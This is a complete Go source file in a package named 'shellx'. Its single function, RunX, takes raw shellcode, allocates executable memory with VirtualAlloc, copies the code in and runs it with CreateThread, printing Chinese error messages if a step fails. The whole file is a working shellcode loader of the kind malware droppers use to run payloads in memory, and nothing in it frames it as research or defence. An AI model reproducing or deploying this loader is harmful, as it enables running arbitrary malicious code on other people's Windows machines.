package shellx

import (
    "fmt"
    "syscall"
    "unsafe"
)

func RunX(sc []byte) {
    k32 := syscall.MustLoadDLL("kernel32.dll")
    va := k32.MustFindProc("VirtualAlloc")
    ct := k32.MustFindProc("CreateThread")
    ws := k32.MustFindProc("WaitForSingleObject")

    var a, t uintptr
    var err error

    a, _, err = va.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
    if a == 0 {
        fmt.Println("分配失败:", err)
        return
    }
    copy((*[1 << 20]byte)(unsafe.Pointer(a))[:], sc)

    t, _, err = ct.Call(0, 0, a, 0, 0, 0)
    if t == 0 {
        fmt.Println("线程失败:", err)
        return
    }
    ws.Call(t, syscall.INFINITE)
}
